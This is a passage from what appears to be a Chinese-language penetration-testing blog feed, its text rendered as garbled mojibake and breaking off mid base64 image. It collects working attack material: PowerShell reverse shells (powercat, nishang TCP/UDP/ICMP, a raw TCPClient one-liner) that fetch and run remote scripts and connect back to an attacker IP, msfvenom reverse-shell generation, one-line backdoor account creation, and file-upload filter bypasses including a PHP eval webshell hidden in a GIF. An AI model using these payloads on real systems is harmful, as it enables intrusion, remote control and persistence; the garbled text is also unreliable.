class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="powershellåå¼¹shell"><a href="#powershellåå¼¹shell" class="headerlink" title="powershellåå¼¹shell"></a>powershellåå¼¹shell</h3><p>powershellåå¼¹shellæœ¬è´¨ä¸Šæ˜¯ä¸€äº›å¤šåŠŸèƒ½ä»£ç é›†åˆï¼Œé€šè¿‡è°ƒç”¨windowsæä¾›çš„apiæ¥å£å®ç°ç½‘ç»œé€šä¿¡å’ŒæŒ‡ä»¤è§£ææ‰§è¡Œçš„åŠŸèƒ½ã€‚</p>
<h4 id="1ï¼‰powercatåå¼¹shell"><a href="#1ï¼‰powercatåå¼¹shell" class="headerlink" title="1ï¼‰powercatåå¼¹shell"></a>1ï¼‰powercatåå¼¹shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ”»å‡»è€…(192.168.159.134)å¼€å¯ç›‘å¬ï¼š</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨powercatç›‘å¬</span></span><br><span class="line">powercat -l -p 6666</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡æœºåå¼¹cmd shellï¼š</span></span><br><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString</span><br><span class="line">(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>);</span><br><span class="line">powercat -c 192.168.159.134 -p 6666 -e cmd</span><br></pre></td></tr></table></figure>



<h4 id="2ï¼‰nishangåå¼¹shell"><a href="#2ï¼‰nishangåå¼¹shell" class="headerlink" title="2ï¼‰nishangåå¼¹shell"></a>2ï¼‰nishangåå¼¹shell</h4><p>Nishangæ˜¯ä¸€ä¸ªåŸºäºPowerShellçš„æ”»å‡»æ¡†æ¶ï¼Œé›†åˆäº†ä¸€äº›PowerShellæ”»å‡»è„šæœ¬å’Œæœ‰æ•ˆè½½è·ï¼Œå¯åå¼¹TCP&#x2F; UDP&#x2F; HTTP&#x2F;HTTPS&#x2F; ICMPç­‰ç±»å‹shellã€‚</p>
<p><strong>Reverse TCP shell</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ”»å‡»è€…(192.168.159.134)å¼€å¯ç›‘å¬ï¼š</span></span><br><span class="line">nc <span class="literal">-lvp</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡æœºæ‰§è¡Œï¼š</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com</span></span><br><span class="line"><span class="string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ–è€…å°†nishangä¸‹è½½åˆ°æ”»å‡»è€…æœ¬åœ°ï¼š</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellTcp.ps1&#x27;</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p><strong>Reverse UDP shell</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ”»å‡»è€…(192.168.159.134)å¼€å¯ç›‘å¬ï¼š</span></span><br><span class="line">nc <span class="literal">-lvup</span> <span class="number">53</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡æœºæ‰§è¡Œï¼š</span></span><br><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellUdp.ps1&#x27;</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellUdp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">53</span></span><br></pre></td></tr></table></figure>

<p><strong>Reverse ICMP shell</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆæ”»å‡»ç«¯ä¸‹è½½icmpsh_m.pyæ–‡ä»¶</span></span><br><span class="line">https://github.com/inquisb/icmpsh)å’Œnishangä¸­çš„Invoke-PowerShellIcmp.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ”»å‡»è€…(192.168.159.134)æ‰§è¡Œ</span></span><br><span class="line">sysctl -w net.ipv4.icmp_echo_ignore_all=1 <span class="comment">#å¿½ç•¥æ‰€æœ‰icmpåŒ…</span></span><br><span class="line">python icmpsh_m.py 192.168.159.134 192.168.159.138 <span class="comment">#å¼€å¯ç›‘å¬</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡æœº(192.168.159.138)æ‰§è¡Œ</span></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.159.134/nishang/Shells/Invoke-PowerShellIcmp.ps1&#x27;</span>);Invoke-PowerShellIcmp -IPAddress 192.168.159.134</span><br></pre></td></tr></table></figure>

<h4 id="3ï¼‰è‡ªå®šä¹‰powershellå‡½æ•°åå¼¹shell"><a href="#3ï¼‰è‡ªå®šä¹‰powershellå‡½æ•°åå¼¹shell" class="headerlink" title="3ï¼‰è‡ªå®šä¹‰powershellå‡½æ•°åå¼¹shell"></a>3ï¼‰è‡ªå®šä¹‰powershellå‡½æ•°åå¼¹shell</h4><p>åˆ©ç”¨powershellåˆ›å»ºä¸€ä¸ªNet.Sockets.TCPClientå¯¹è±¡ï¼Œé€šè¿‡Socketåå¼¹tcp shellã€‚</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ”»å‡»è€…(192.168.159.134) å¼€å¯ç›‘å¬ </span></span><br><span class="line">nc <span class="literal">-lvp</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›®æ ‡æœºæ‰§è¡Œ </span></span><br><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object Net.Sockets.TCPClient(&#x27;192.168.159.134&#x27;,6666);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();</span></span><br><span class="line"><span class="string">[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;</span></span><br><span class="line"><span class="string"><span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );</span></span><br><span class="line"><span class="string"><span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);</span></span><br><span class="line"><span class="string"><span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="4ï¼‰Empire-ç»“åˆofficeåå¼¹shell"><a href="#4ï¼‰Empire-ç»“åˆofficeåå¼¹shell" class="headerlink" title="4ï¼‰Empire ç»“åˆofficeåå¼¹shell"></a>4ï¼‰Empire ç»“åˆofficeåå¼¹shell</h4><p>Empire(<a href="https://github.com/EmpireProject/Empire)%E5%9F%BA%E4%BA%8Epowershell%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%8F%AF%E5%88%A9%E7%94%A8office%E5%AE%8F%E3%80%81OLE%E5%AF%B9%E8%B1%A1%E6%8F%92%E5%85%A5%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E3%80%81HTML%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F(HTAs)%E7%AD%89%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%E3%80%82">https://github.com/EmpireProject/Empire)åŸºäºpowershellçš„åæ¸—é€æ”»å‡»æ¡†æ¶ï¼Œå¯åˆ©ç”¨officeå®ã€OLEå¯¹è±¡æ’å…¥æ‰¹å¤„ç†æ–‡ä»¶ã€HTMLåº”ç”¨ç¨‹åº(HTAs)ç­‰è¿›è¡Œåå¼¹shellã€‚</a></p>
<ul>
<li>åˆ©ç”¨officeå®åå¼¹shell </li>
<li>åˆ©ç”¨office OLEå¯¹è±¡æ’å…¥batæ–‡ä»¶åå¼¹shell</li>
</ul>
<p><strong>Relevant Link:</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/99793</span><br></pre></td></tr></table></figure>

<h3 id="msfvenom-è·å–åå¼¹ä¸€å¥è¯"><a href="#msfvenom-è·å–åå¼¹ä¸€å¥è¯" class="headerlink" title="msfvenom è·å–åå¼¹ä¸€å¥è¯"></a><strong>msfvenom è·å–åå¼¹ä¸€å¥è¯</strong></h3><p>å­¦ä¹ è¿‡ç¨‹ä¸­å‘ç°å…¶å®å¼ºå¤§çš„MSFæ¡†æ¶ä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†ç”Ÿæˆä¸€å¥è¯åå¼¹shellçš„å·¥å…·ï¼Œå³msfvenomã€‚ç»å¯¹çš„å®ç”¨ï¼Œå½“æˆ‘ä»¬ä¸è®°å¾—å‰é¢è¯´çš„æ‰€æœ‰åå¼¹shellçš„åå¼¹è¯­å¥æ—¶ï¼Œåªè¦æˆ‘ä»¬æœ‰Metasploit,éšæ—¶æˆ‘ä»¬éƒ½å¯ä»¥ä½¿ç”¨msfvenom -l æ¥æŸ¥è¯¢ç”Ÿæˆæˆ‘ä»¬æ‰€éœ€è¦çš„å„ç±»å‘½ä»¤è¡Œä¸€å¥è¯ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•ä¸ºå„ä½çœ‹å®˜è€çˆ·ä»¬æ”¶é›†å¦‚ä¸‹ã€‚- </p>
<ul>
<li>æŸ¥è¯¢ payload å…·ä½“è·¯å¾„</li>
</ul>
<p>æˆ‘ä»¬ç›´æ¥å¯ä»¥ä½¿ç”¨ msfvenom -l ç»“åˆå…³é”®å­—è¿‡æ»¤ï¼ˆå¦‚cmd&#x2F;unix&#x2F;reverseï¼‰ï¼Œæ‰¾å‡ºæˆ‘ä»¬éœ€è¦çš„å„ç±»åå¼¹ä¸€å¥è¯payloadçš„è·¯å¾„ä¿¡æ¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># msfvenom -l payloads &#x27;cmd/unix/reverse&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://p3.ssl.qhimg.com/t01368126ef4dfcc554.png"><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01368126ef4dfcc554.png" alt="http://p9.qhimg.com/t014f984e560232d602.png"></a></p>
<p>æŸ¥çœ‹ä»¥ä¸Šæˆªå›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°msfvenomæ”¯æŒç”Ÿæˆåå¼¹shellä¸€å¥è¯çš„ç±»å‹éå¸¸ä¸°å¯Œï¼Œè¿™é‡Œå‡ ä¹æ˜¯åº”æœ‰å°½æœ‰ï¼Œå¤§å®¶å¯ä»¥ä¾æ®æ¸—é€æµ‹è¯•å¯¹è±¡è‡ªè¡Œé€‰æ‹©ä½¿ç”¨ã€‚</p>
<p><strong>ç”Ÿæˆæˆ‘ä»¬æˆ‘ä»¬éœ€è¦çš„å‘½ä»¤è¡Œä¸€å¥è¯</strong></p>
<p>ä¾ç…§å‰é¢æŸ¥æ‰¾å‡ºçš„å‘½ä»¤ç”Ÿæˆä¸€å¥è¯payloadè·¯å¾„ï¼Œæˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤ç”Ÿæˆåå¼¹ä¸€å¥è¯ï¼Œç„¶åå¤åˆ¶ç²˜è´´åˆ°é¶æœºä¸Šè¿è¡Œå³å¯ã€‚</p>
<h4 id="bash-åå¼¹ä¸€å¥è¯ç”Ÿæˆ"><a href="#bash-åå¼¹ä¸€å¥è¯ç”Ÿæˆ" class="headerlink" title="bash åå¼¹ä¸€å¥è¯ç”Ÿæˆ"></a><strong>bash åå¼¹ä¸€å¥è¯ç”Ÿæˆ</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>

<h4 id="é˜‰å‰²ç‰ˆncåå¼¹ä¸€å¥è¯ç”Ÿæˆ"><a href="#é˜‰å‰²ç‰ˆncåå¼¹ä¸€å¥è¯ç”Ÿæˆ" class="headerlink" title="é˜‰å‰²ç‰ˆncåå¼¹ä¸€å¥è¯ç”Ÿæˆ"></a><strong>é˜‰å‰²ç‰ˆncåå¼¹ä¸€å¥è¯ç”Ÿæˆ</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01bc2936c36f38c0e9.png" alt="https://p0.ssl.qhimg.com/t01bc2936c36f38c0e9.png"></p>
<h4 id="è·å–pythonä¸€å¥è¯"><a href="#è·å–pythonä¸€å¥è¯" class="headerlink" title="è·å–pythonä¸€å¥è¯"></a><strong>è·å–pythonä¸€å¥è¯</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_t01f8abd9cc27aac7ca.png" alt="https://p0.ssl.qhimg.com/t01f8abd9cc27aac7ca.png"></p>
<p>å‚è€ƒé“¾æ¥</p>
<p><a href="https://www.cnblogs.com/LittleHann/p/12038070.html">https://www.cnblogs.com/LittleHann/p/12038070.html</a></p>
<p><a href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p>
<h1 id="ä¸€å¥è¯æ·»åŠ è´¦å·"><a href="#ä¸€å¥è¯æ·»åŠ è´¦å·" class="headerlink" title="ä¸€å¥è¯æ·»åŠ è´¦å·"></a><strong>ä¸€å¥è¯æ·»åŠ è´¦å·</strong></h1><p>ä½ ä¸æ˜¯ä¸ç»™æˆ‘æä¾›äº¤äº’çš„ç•Œé¢å—ï¼Œé‚£æˆ‘å°±æ˜¯ä½¿ç”¨è„šæœ¬å¼çš„æ–¹æ³•ï¼Œä½¿ç”¨ä¸€å¥è¯å®Œæˆè´¦å·å¯†ç çš„æ·»åŠ ï¼Œæœ‰å…³ä¸€å¥è¯è´¦å·å¯†ç çš„æ·»åŠ ï¼Œç¬”è€…æ”¶é›†äº†ä»¥ä¸‹å‡ ç§æ–¹å¼ã€‚</p>
<p><strong>3.1.1 chpasswd æ–¹æ³•</strong></p>
<p><strong>ï¼ˆ1ï¼‰æ‰§è¡Œè¯­å¥</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd newuser;echo &quot;newuser:password&quot;|chpasswd</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰æ“ä½œå®ä¾‹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line"></span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:$6$H0a/Nx.w$c2549uqXOULY4KvfCK6pTJQahhW7fuYYyHlo8HpnBxnUMtbXEbhgvFywwyPo5UsCbSUAMVvW9a7PsJB12TXPn.:17425:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p><strong>3.1.2 useradd -p æ–¹æ³•</strong></p>
<p><strong>ï¼ˆ1ï¼‰ æ‰§è¡Œè¯­å¥</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd -p encrypted_password newuser</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰ æ“ä½œå®ä¾‹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd -p `openssl passwd 123456` guest</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:h8S5msqJLVTfo:17425:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ3ï¼‰ ç›¸åŒæ–¹æ³•å…¶ä»–å®ç°</strong></p>
<p> ç›¸åŒæ–¹æ³•ä¸åŒå®ç°ä¸€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd -p &quot;$(openssl passwd 123456)&quot; guest</span><br><span class="line">root@ifly-21171:~#</span><br></pre></td></tr></table></figure>

<p>ç›¸åŒæ–¹æ³•ä¸åŒå®ç°äºŒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user_password=&quot;`openssl passwd 123456`&quot;</span><br><span class="line">useradd -p &quot;$user_password&quot; guest</span><br></pre></td></tr></table></figure>

<p><strong>3.1.3 echo -e æ–¹æ³•</strong></p>
<p>ï¼ˆ1ï¼‰æ‰§è¡Œè¯­å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</span><br></pre></td></tr></table></figure>

<p>ï¼ˆ2ï¼‰ æ“ä½œå®ä¾‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@ifly-21171:~# useradd test;echo -e &quot;123456n123456n&quot; |passwd test</span><br><span class="line">Enter new UNIX password: Retype new UNIX password: passwd: password updated successfully</span><br><span class="line">root@ifly-21171:~# vim /etc/shadow</span><br><span class="line">sshd:*:17255:0:99999:7:::</span><br><span class="line">pollinate:*:17255:0:99999:7:::</span><br><span class="line">postgres:*:17390:0:99999:7:::</span><br><span class="line">guest:h/UnnFIjqKogw:17425:0:99999:7:::</span><br><span class="line">test:$6$rEjvwAb2$nJuZ1MDt0iKbW9nigp8g54ageiKBDuoLObLd1kWUC2FmLS0xCFFZmU4dzRtX/i2Ypm9uY6oKrSa9g</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨</category>
      </categories>
      <tags>
        <tag>ç½‘ç»œå®‰å…¨</tag>
        <tag>æ€»ç»“</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ æ–¹å¼æ€»ç»“</title>
    <url>/articles/9372c8c3/</url>
    <content><![CDATA[<h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><hr>
<h2 id="æ–‡ä»¶ä¸Šä¼ å‡½æ•°"><a href="#æ–‡ä»¶ä¸Šä¼ å‡½æ•°" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ å‡½æ•°"></a>æ–‡ä»¶ä¸Šä¼ å‡½æ•°</h2><p>PHPä¸­ ä½¿ç”¨ move_uploaded_file()å‡½æ•°æ¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¯¥å‡½æ•°çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool move_uploaded_file ( string ``$filename` `, string ``$destination` `)</span><br></pre></td></tr></table></figure>

<p>move_uploaded_file()å‡½æ•°æ˜¯å°†ä¸Šä¼ æ–‡ä»¶å‚¨å­˜åˆ°æŒ‡å®šä½ç½®ã€‚å¦‚æœæˆåŠŸï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚ å‚æ•° filenameæ˜¯ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶æ–‡ä»¶åï¼Œå°±æ˜¯$S_FILES[tem_name]ï¼›å‚æ•° destination æ˜¯ä¸Šä¼ åä¿å­˜çš„æ–°çš„è·¯å¾„å’Œåç§°ã€‚</p>
<h2 id="å‰ç«¯jsç»•è¿‡"><a href="#å‰ç«¯jsç»•è¿‡" class="headerlink" title="å‰ç«¯jsç»•è¿‡"></a>å‰ç«¯jsç»•è¿‡</h2><p>ä¿®æ”¹js æˆ– ä½¿ç”¨burpsuite ä¿®æ”¹ä¸Šä¼ å</p>
<p>æˆ–æ˜¯ä½¿ç”¨sourcesè°ƒè¯• ,ä¿®æ”¹js</p>
<p><strong>æ“ä½œæ–¹å¼</strong>:</p>
<p>æ‰¾åˆ°è¿‡æ»¤çš„jsä»£ç , å°†æ•´ä¸ªå‡½æ•°å¤åˆ¶ç²˜è´´å¹¶ä¿®æ”¹, åœ¨conslesæ§åˆ¶å°å›è½¦å³å¯</p>
<h2 id="æœåŠ¡å™¨å¯¹MIMEä¿¡æ¯æ£€æµ‹"><a href="#æœåŠ¡å™¨å¯¹MIMEä¿¡æ¯æ£€æµ‹" class="headerlink" title="æœåŠ¡å™¨å¯¹MIMEä¿¡æ¯æ£€æµ‹"></a>æœåŠ¡å™¨å¯¹MIMEä¿¡æ¯æ£€æµ‹</h2><p>ä¿®æ”¹Content-Type</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">image/jpeg  image/png  image/gif</span><br></pre></td></tr></table></figure>



<h2 id="åç¼€é»‘åå•è¿‡æ»¤"><a href="#åç¼€é»‘åå•è¿‡æ»¤" class="headerlink" title="åç¼€é»‘åå•è¿‡æ»¤"></a>åç¼€é»‘åå•è¿‡æ»¤</h2><p>ä¿®æ”¹ä¸º å…¶ä»–ä¸å¸¸è§åç¼€å , æˆ–åˆ©ç”¨å¤§å°å†™ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¸Šä¼ ä¸å¸¸è§çš„PHPæ‰©å±•åæ¥ç»•è¿‡é»‘åå•</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pht, phpt, phtml, php3, php4, php5, php6,php7</span><br></pre></td></tr></table></figure>

<ul>
<li>å¤§å°å†™ç»•è¿‡</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pHp, Php, phP</span><br></pre></td></tr></table></figure>





<h2 id="é…ç½®æ–‡ä»¶è§£æç»•è¿‡"><a href="#é…ç½®æ–‡ä»¶è§£æç»•è¿‡" class="headerlink" title="é…ç½®æ–‡ä»¶è§£æç»•è¿‡"></a>é…ç½®æ–‡ä»¶è§£æç»•è¿‡</h2><p><strong>Apache:</strong>  é€šè¿‡ä¸Šä¼ .htaccessæ–‡ä»¶ä½¿å¾—.jpgç­‰åç¼€æ–‡ä»¶è¢«phpè§£æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType  application/x-httpd-php    .jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;s.jpg&quot;&gt;</span><br><span class="line">Sethandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p><strong>Nignx:</strong>   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user.iniå†…å®¹ä¸ºï¼šauto_prepend_file=12.jpg //åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶</span><br><span class="line">user.iniå†…å®¹ä¸ºï¼šauto_append_file=12.jpg  //åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p><code>æ³¨æ„äº‹é¡¹ï¼šuser.iniæ–‡ä»¶ä¸€æ®µæ—¶é—´åç”Ÿæ•ˆï¼ˆ5åˆ†é’Ÿå·¦å³ï¼‰</code></p>
<h2 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h2><h2 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h2><p>äºŒæ¬¡æ¸²æŸ“, å‚ç…§å›½å…‰å¤§ä½¬åšå®¢çš„ <a href="https://www.sqlsec.com/2020/10/upload.html">æ–‡ä»¶ä¸Šä¼ æ€»ç»“</a></p>
<p><code>imagecreatefrom</code> ç³»åˆ—æ¸²æŸ“å›¾ç‰‡éƒ½å¯èƒ½è¢«ç»•è¿‡ï¼Œæœ‰äº›ç‰¹æ®Šçš„å›¾é©¬æ˜¯å¯ä»¥é€ƒé¿è¿‡æ¸²æŸ“çš„</p>
<h3 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h3><p>æ¸²æŸ“å‰åçš„ä¸¤å¼  GIFï¼Œæ²¡æœ‰å‘ç”Ÿå˜åŒ–çš„ç©ºç™½æ•°æ®éƒ¨åˆ†ç›´æ¥æ’å…¥<code>Webshell</code>å³å¯</p>
<p><img src="https://typora-1305076737.cos.ap-shanghai.myqcloud.com/typora_image-20211121124424741.png" alt="image-20211121124424741"></p>
<p>åˆ¶ä½œå¥½çš„å›¾ç‰‡é©¬ ,  <code>&lt;?php eval($_REQUEST[1]);?&gt;</code>  </p>
<p><img src="data:image/gif;base64,R0lGODlhMAAwAPUAAAICAhENDBcXFignJzIyKDc3N0VFRVNJTFdXV2dnZnh4eIiJiJiYmKeoqLi4t8jIyNLOy9nZ2eno6On07fPz6v39/QwZECAXHCEiHEBAPmZaWl5oZ7Bien6Afb50g8R6iaCgn9eJodGvrsC8ttOxsPKot/2vx8fR0P/G2uPd393h4Prp5Tw/cGhwIGV2YWwoJF9SRVFVRVNUWzFdKTs/PgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH/C05FVFNDQVBFMi4wAwEAAAAh/wtYTVAgRGF0YVhNUP8/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG10YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4wLWMwNjAgNjEuMTM0Nzc3LCAyMDEwLzAyLzEyLTE3OjMyOjAwICAgICAgICAiPjxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53Lm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZjphYm91dD0iIiD/eG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1uczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M1IFdpbmRvd3MiIHhtcE06SW5zdGFuY2VJRD0ieG1wLmlpZDpCRTNCNDI5NDJBQTcxMUU0OUFGQjk5NDg2MkVDRDM0RiIgeG1w/01NOkRvY3VtZW50SUQ9InhtcC5pZDpCRTNCNDI5NTJBQTcxMUU0OUFGQjk5NDg2MkVDRDM0RiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOkJFM0I0MjkyMkFBNzExRTQ5RkI5OTQ4NjJFQ0QzNEYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkUzQjQyOTMyQUE3MTFFNDlBRkI5OTQ2MkVDRDM0RiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGP